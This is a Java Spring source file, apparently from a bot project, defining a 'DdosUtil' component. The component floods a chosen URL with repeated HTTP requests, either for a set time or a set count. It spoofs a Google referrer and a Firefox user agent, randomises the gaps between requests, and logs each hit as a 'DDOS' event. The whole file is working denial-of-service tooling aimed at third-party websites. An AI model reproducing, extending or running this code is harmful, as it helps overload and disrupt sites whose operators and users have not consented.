package ua.bot.html_parser.utils;

import org.jsoup.Jsoup;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Component;
import ua.bot.html_parser.entity.ParseParameters;
import ua.bot.html_parser.entity.ParseType;
import ua.bot.html_parser.service.ProcessService;

import java.io.IOException;
import java.security.SecureRandom;
import java.time.LocalDateTime;
import java.util.Random;

@Component
public class DdosUtil {
    private static final Logger log = LoggerFactory.getLogger(DdosUtil.class);
    private final ProcessService processService;
    private final ProcessLogUtil processLogUtil;
    private long processId;

    @Autowired
    public DdosUtil(ProcessLogUtil processLogUtil, ProcessService processService) {
        this.processLogUtil = processLogUtil;
        this.processService = processService;
    }

    @Async
    public void ddosByTime(String url, ParseParameters parameters, long id) {
        if (checkParameters(url, parameters)) {
            processId = id;
            Thread thread = Thread.currentThread();
            boolean started = processService.addThreadById(id, thread);
            log.info("CURRENT PROCESS ddosByTime ID {}", id);
            long mainTime = parameters.getParseTimeout();
            int timeDelta = parameters.getParseDelta();
            if (mainTime <= (long)timeDelta) {
                timeDelta = (int)(mainTime / 2L);
            }

            ParseType parseType = parameters.getParseType().get(0);
            LocalDateTime endTime = LocalDateTime.now().plusMinutes(parseType.getTime());
            if (started) {
                processLogUtil.appendLog(id, String.format("Process with ID %s started OK\nInside process ID %s", id, thread.getId()));
            }

            while(LocalDateTime.now().isBefore(endTime) && processService.isProcessing(id)) {
                try {
                    callUrl(url, mainTime, timeDelta);
                } catch (InterruptedException | IOException var13) {
                    log.error(var13.getMessage());
                    processLogUtil.appendLog(id, String.format("Error on process with ID %s", id));
                }
            }

            processLogUtil.appendLog(id, String.format("Process with Id %s completed", processId));
            log.info("Process with id {} completed, time - {}", processId, LocalDateTime.now());
        }
    }

    @Async
    public void ddosByCount(String url, ParseParameters parameters, long id) {
        if (checkParameters(url, parameters)) {
            processId = id;
            Thread thread = Thread.currentThread();
            boolean started = processService.addThreadById(id, thread);
            log.info("CURRENT PROCESS ddosByTime ID {}", id);
            long mainTime = parameters.getParseTimeout();
            int timeDelta = parameters.getParseDelta();
            if (mainTime <= (long)timeDelta) {
                timeDelta = (int)(mainTime / 2L);
            }

            ParseType parseType = parameters.getParseType().get(0);
            int counter = 0;
            if (started) {
                processLogUtil.appendLog(id, String.format("Process with ID %s started OK\nInside process ID %s", id, thread.getId()));
            }

            for(; (long)counter < parseType.getCount() && processService.isProcessing(id); ++counter) {
                try {
                    callUrl(url, mainTime, timeDelta);
                } catch (InterruptedException | IOException var13) {
                    log.error(var13.getMessage());
                    processLogUtil.appendLog(id, String.format("Error on process with ID %s", id));
                }
            }

            processLogUtil.appendLog(id, String.format("Process with Id %s completed", processId));
        }
    }

    private boolean checkParameters(String data, ParseParameters parameters) {
        return data != null && parameters != null;
    }

    private long processSleepTime(long mainTime, int delta) {
        boolean plusOrMinus = (new SecureRandom()).nextBoolean();
        Random rand = new Random();
        int randomDelta = rand.nextInt(delta);
        return plusOrMinus ? mainTime + (long)randomDelta : mainTime - (long)randomDelta;
    }

    private void callUrl(String url, long mainTime, int timeDelta) throws IOException, InterruptedException {
        Jsoup.connect(url).ignoreContentType(true).followRedirects(true).timeout(90000).referrer("http://www.google.com").userAgent("Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0").execute();
        long timeout = processSleepTime(mainTime, timeDelta);
        if (timeout < 0L) {
            timeout = 15L;
        }

        Thread thread = Thread.currentThread();
        log.info("{} : DDOS Id - {}, DDOS timeout - {}, Current thread ID - {}", new Object[]{LocalDateTime.now(), processId, timeout, thread.getId()});
        processLogUtil.appendLog(processId, String.format("%s : DDOS Id - %s, DDOS timeout - %s", LocalDateTime.now(), processId, timeout));
        Thread.sleep(timeout);
    }
}